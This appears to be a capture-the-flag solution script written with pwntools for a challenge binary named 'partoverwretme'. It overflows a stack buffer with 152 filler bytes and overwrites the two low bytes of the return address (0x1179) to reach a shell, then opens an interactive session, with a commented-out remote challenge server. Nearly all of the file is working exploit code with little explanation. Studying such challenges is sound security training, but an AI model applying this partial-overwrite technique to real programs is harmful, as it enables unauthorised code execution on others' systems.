from pwn import *
# context.terminal = ["tmux", "split", "-h"]
# context.log_level = "debug" # shows payload

def main():
    # print checksec
    elf = context.binary = ELF("./partoverwretme")

    # enable pwndbg locally
    conn = gdb.debug("./partoverwretme", gdbscript="""b main continue""")
    # conn = remote('vuln.redrocket.club',7123)

    ############ EXPLOIT GOES HERE ###############
    # strategy
    conn.recvuntil("?")

    # size of buffer plus 2 to overwrite the least sign. bytes of return address
    size = str(154)
    conn.sendline(size)

    conn.recvuntil(".")

    # two least significant bytes
    least_sign_bytes_plsgivemeshell = p16(0x1179)
    payload = b'A' * 152 + least_sign_bytes_plsgivemeshell

    conn.sendline(payload)

    ###########################################

    # open terminal
    conn.interactive()

if __name__ == "__main__":
    main()